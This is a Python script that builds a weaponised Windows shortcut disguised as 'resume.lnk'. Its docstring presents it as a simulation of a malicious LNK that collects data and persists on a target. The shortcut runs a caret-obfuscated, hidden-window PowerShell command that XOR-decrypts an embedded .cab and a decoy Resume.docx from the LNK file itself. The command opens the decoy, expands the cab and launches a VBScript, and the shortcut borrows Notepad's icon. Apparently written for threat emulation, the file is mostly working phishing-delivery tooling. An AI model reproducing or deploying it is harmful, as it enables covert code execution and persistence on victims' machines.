from pylnk3 import parse, for_file

"""
__author__ == @tccontre18 - Br3akp0int
description: this is simple fatlnk generator to simulate a lnk that contains embeded .cab files to execute malicious files to collect and persist on the targeted machine.

"""
...

def make_lnk():
    lnk_fname = 'resume.lnk-1'
    lnk = for_file(
        target_file = r"C:\Windows\System32\cmd.exe",
        lnk_name=lnk_fname,
        arguments=r"/c p^owe^rshe^l^l -windowstyle hidden function mw_decrypt_portion_of_lnk {   param($param_filePath,$offset,$param_byte_array_len,$param_decryption_key,$param_save_file);   $wStream=New-Object System.IO.FileStream($param_filePath,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read);   $wStream.Seek($offset,[System.IO.SeekOrigin]::Begin);   $buffer=New-Object byte[] $param_byte_array_len;   $wStream.Read($buffer,0,$param_byte_array_len);   $wStream.Close();   for($index_ptr=0; $index_ptr -lt $param_byte_array_len; $index_ptr++)   {     $buffer[$index_ptr]=$buffer[$index_ptr] -bxor $param_decryption_key;   }   sc $param_save_file  $buffer -Encoding  Byte; };  $curDir = Get-Location; Write-Host $curDir;  $expandedCabDirPath = Join-Path -Path $curDir -ChildPath 'documents'; New-Item -ItemType Directory -Path $expandedCabDirPath; $cabFilePath = Join-Path -Path $curDir -ChildPath 'UHCYbG.cab';  $docFilePath = Join-Path -Path $curDir -ChildPath 'Resume.docx'; $lnkFilePath = Join-Path -Path $curDir -ChildPath 'fatlnk.lnk'; $vbsFilePath = Join-Path -Path $expandedCabDirPath -ChildPath 'start.vbs';  Write-Host $cabFilePath; Write-Host $docFilePath; Write-Host $lnkFilePath; mw_decrypt_portion_of_lnk -param_filePath  $lnkFilePath -offset  0x00001000 -param_byte_array_len 0x13479 -param_decryption_key  0x88 -param_save_file  $cabFilePath;  mw_decrypt_portion_of_lnk -param_filePath  $lnkFilePath -offset  0x00014473 -param_byte_array_len 0x267c -param_decryption_key  0x51 -param_save_file  $docFilePath;  Start-Process $docFilePath; expand $cabFilePath -F:* $expandedCabDirPath; Start-Process $vbsFilePath;",
        #arguments=r"/c p^owe^rshe^l^l -windowstyle hidden Write-Host 'Hello'",
        description="test",
        window_mode="Minimized",
        icon_file=r"C:\Windows\System32\notepad.exe",
        icon_index=0,
    )
    print("\n" + str(lnk))

    lnk.save(lnk_fname)

    # For troubleshooting...
    parse_out = parse(lnk_fname)

    print('\n' + str(parse_out))


make_lnk()
